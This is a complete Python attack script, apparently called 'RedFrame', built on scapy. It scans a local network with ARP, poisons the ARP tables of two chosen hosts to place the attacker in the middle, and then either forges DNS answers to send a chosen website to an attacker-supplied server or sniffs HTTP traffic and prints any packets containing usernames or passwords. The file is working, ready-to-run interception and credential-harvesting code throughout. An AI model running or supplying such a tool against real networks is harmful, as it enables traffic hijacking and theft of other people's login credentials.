#!/usr/bin/env python

import time
import scapy.all as scapy
import psutil
import threading
import netfilterqueue
import argparse
import sys
from scapy.layers import http
from termcolor import colored

# # function to get the command line arguments and set the help options
# def getcmd_args():
#     cmd_parser = argparse.ArgumentParser()
#     cmd_parser.add_argument("-n", "--network", dest="target_net", help="Target network range or individual ip address to scan")
#     options = cmd_parser.parse_args()
#     return options

# function to scan a target network range for responsive machines and return a target list
def scan (ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    # Combine sections into one request
    arp_request_broadcast = broadcast/arp_request

    #Send packet with custom Ethernet framce and capture responses in variables responsive_list and unresponsive_list
    responsive_list, unresponsive_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)

    target_list = []
    count = 0
    # Iterate over responsive_list returned from scapy.srp and return a target list
    for item in responsive_list:
        target_dict = {"index": count, "ip": item[1].psrc, "mac": item[1].hwsrc}
        target_list.append(target_dict)
        count += 1
    return target_list

# function to spoof a machine's MAC address in a target's ARP table
def arp_spoof(tgt_ip, tgt_mac, spoof_ip):
    #craft and send an ARP response to the target associating the attacker machine's MAC with the spoofed machines IP
    packet = scapy.ARP(op=2, pdst=tgt_ip, hwdst=tgt_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

# function to restore the target machine's ARP table
def arp_restore(tgt_ip, tgt_mac, src_ip, src_mac):
    # craft and send an ARP response to the target associating the re-associating spoofed machines IP and MAC
    packet = scapy.ARP(op=2, pdst=tgt_ip, hwdst=tgt_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=5, verbose=False)

def spoof(targetip1, targetmac1, targetip2, targetmac2, stop_spoof):
    packet_count = 0
    # spoof two target machines and turn attacker machine into a Man in the Middle
    while True:
        packet_count = packet_count + 2
        arp_spoof(targetip1, targetmac1, targetip2)
        arp_spoof(targetip2, targetmac2, targetip1)
        #print("\r[+] Packets sent: " + str(packet_count), end="")
        time.sleep(2)
        if stop_spoof():
            # restore target machine's ARP tables
            arp_restore(targetip1, targetmac1, targetip2, targetmac2)
            arp_restore(targetip2, targetmac2, targetip1, targetmac1)
            break

# Function to parse and print target machine list
def print_output(results_list):
    print(colored("--------------------------------------------------", 'blue'))
    print("Index\tIP\t\t\tAt MAC Address")
    print(colored("--------------------------------------------------", 'blue'))
    for target in results_list:
        print(str(target["index"]) + "\t" + target["ip"] + "\t\t" + target["mac"])

# Simple function to return a list of valid interfaces and their addresses
def get_network_interfaces():
    return psutil.net_if_addrs().items()

# Simple function using Scapy to sniff the packets on an interface and call
# the function "process_packet" once a packet is captured
def sniff(interface, stop_sniff):
    while True:
        scapy.sniff(iface=interface, store=False, prn=process_packet)
        if stop_sniff():
            break

def extract_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

# Function designed to extract logon info i packet contains elements listed in "keywords" list
def extract_login_info(packet):
    if packet.haslayer(scapy.Raw):
        sniff_load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword.encode('utf-8') in sniff_load:  # must account for encoding in Python3
                return sniff_load

# Function designed to process packet if it contains HTTP Request information
# Function will print requested URL, and clear text logon parameters if found
def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = extract_url(packet)
        print ("[+} HTTP Request >> " + url.decode()) # note ".decode" must be used in Python3

        login_info = extract_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info.decode() + "\n\n") # note ".decode" must be used in Python3

# Function designed to process and spoof a DNS Response packet for a targeted URL and webserver
def dns_spoof(packet):
    scapy_packet = scapy.IP(packet.get_payload()) # convert packet payload to Scapy packet
    if scapy_packet.haslayer(scapy.DNSRR): #DNSRR = DNS Request Response
        dnsqry = scapy_packet[scapy.DNSQR].qname # DNS query website
        if tgt_url in dnsqry.decode():
            print ("[+] Spoofing target website: " + tgt_url)
            dnsresponse = scapy.DNSRR(rrname=dnsqry, rdata=tgt_ip)
            scapy_packet[scapy.DNS].ancount = 1 # modified to reflect only 1 DNS response
            scapy_packet[scapy.DNS].an = dnsresponse

            # General packet cleanup to allow scapy to create checksums and lengths to packets are valid
            del scapy_packet[scapy.IP].len # delete IP length data so scapy will recalculate the packetlenth in the response
            del scapy_packet[scapy.IP].chksum  # delete IP chksum data so scapy will recalculate the packetlenth in the response
            del scapy_packet[scapy.UDP].len  # delete UDP length data so scapy will recalculate the packetlenth in the response
            del scapy_packet[scapy.UDP].chksum  # delete UDP chksum data so scapy will recalculate the packetlenth in the response

            packet.set_payload(bytes(scapy_packet)) # set packet payload to manipulated scapy packet

    packet.accept() # forward packet to target


tgt_network = input("Enter target network range or individual ip address to scan > ")
scan_result = scan(tgt_network)
print_output(scan_result)

# Solicit user input for target machines to spoof on network
print()
tgt_index1 = input("Enter index of first target to spoof > ")
tgt_index2 = input("Enter index of second target to spoof > ")

targetip1 = scan_result[int(tgt_index1)]["ip"]
targetmac1 = scan_result[int(tgt_index1)]["mac"]

targetip2 = scan_result[int(tgt_index2)]["ip"]
targetmac2 = scan_result[int(tgt_index2)]["mac"]

print(colored("Spoofing targets: " + tgt_index1 + " and " + tgt_index2, 'green'))

stop_script = False # variable used to stop/kill threads

# create thread for arp spoofing and start the thread
tspoof = threading.Thread(target=spoof, args=(targetip1, targetmac1, targetip2, targetmac2, lambda:stop_script))
tspoof.start()

print(colored("-------------------------------------------------------", 'red'))
print("Option\tMenu Selection")
print(colored("-------------------------------------------------------", 'red'))
print("1.\tDNS Spoofing")
print("2.\tSniff Traffic on Interface")
menu_select = input("Enter RedFrame option > ")

if menu_select == "1":
    try:
        global tgt_url
        global tgt_ip
        print("\n")
        tgt_url = input("Enter URL of website to spoof > ")
        tgt_ip = input("Enter IP of webserver to redirect traffic to > ")

        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, dns_spoof)
        queue.run()

    except KeyboardInterrupt:
        # restore target machine's ARP tables
        print("[+] Detected User input CTRL + C ...... Restoring target ARP tables and ending sniffing")
        stop_script = True
        sys.exit()

elif menu_select == "2":

    interfaces = get_network_interfaces()  # get all network interfaces on host machine (OS independent)
    print(colored("-------------------------------------------------------", 'red'))
    print("Interface\tIP Addr\t\t\tNet Mask")
    print(colored("-------------------------------------------------------", 'red'))
    for interface in interfaces:
        # based on structure of returned list
        # interface[1][0][1] = IPv4 address
        # interface[1][0][2] = IPv4 net mask
        print(str(interface[0]) + "\t\t" + str(interface[1][0][1]) + "\t\t" + str(interface[1][0][2]))

    # Solicit user input for interface on which to initiate sniffing
    tgt_int = input("Enter interface to sniff packets on e.g. eth0 > ")

    # Sniff traffic on user directed interface
    print(colored("\nSniffing traffic on interface: " + tgt_int + "\n", 'green'))

    #create thread for sniffing traffic and start the thread as a daemon which will terminate upon script termination
    tsniff = threading.Thread(target=sniff, args=(tgt_int, lambda:stop_script))
    tsniff.daemon = True
    tsniff.start()

    try:
        time.sleep(10000)
    except KeyboardInterrupt:
        # restore target machine's ARP tables
        print("[+] Detected User input CTRL + C ...... Restoring target ARP tables and ending sniffing")
        stop_script = True
        sys.exit()
